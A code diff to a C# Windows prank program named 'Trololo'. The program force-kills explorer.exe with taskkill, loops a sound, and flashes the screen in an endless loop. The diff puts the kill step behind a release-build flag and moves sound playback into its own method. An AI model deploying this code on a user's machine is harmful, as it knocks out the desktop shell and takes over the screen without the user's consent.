@@ -1,12 +1,8 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Diagnostics;
 using System.Drawing;
-using System.Linq;
 using System.Media;
-using System.Text;
+using System.Threading;
 using System.Windows.Forms;
 
 namespace Trololo
@@ -26,18 +22,19 @@ namespace Trololo
             Process p = new Process();
             p.StartInfo.FileName = "taskkill.exe";
             p.StartInfo.Arguments = "/f /im explorer.exe";
-;            p.StartInfo.UseShellExecute = false;
+;           p.StartInfo.UseShellExecute = false;
             p.StartInfo.RedirectStandardInput = false;
             p.StartInfo.RedirectStandardOutput = false;
             p.StartInfo.RedirectStandardError = false;
             p.StartInfo.CreateNoWindow = true;
+            #if RELEASE
             p.Start();
             p.WaitForExit();
+            #endif
             p.Close();
+            PlaySound();
             this.FormClosing += Form1_FormClosing;
             this.Visible = true;
-            SoundPlayer player = new SoundPlayer(Properties.Resources.ResourceManager.GetStream("trolo"));
-            player.PlayLooping();
             Rectangle bounds = Screen.GetBounds(Screen.GetBounds(Point.Empty));
             Random rd = new Random();
             while (true)
@@ -61,6 +58,22 @@ namespace Trololo
                     Delay((int)(128 * 1.43333));
                     label1.BackColor = Color.Empty;
                 }
+            }
+        }
+        private void showAlarm()
+        {
+            try { new Thread(new ThreadStart(PlaySound)).Start(); }catch (Exception) { }
+        }
+
+        private void PlaySound()
+        {
+            try
+            {
+                new SoundPlayer(Properties.Resources.ResourceManager.GetStream("trolo")).PlayLooping();
+            }
+            catch (Exception)
+            {
+
             }
         }
 
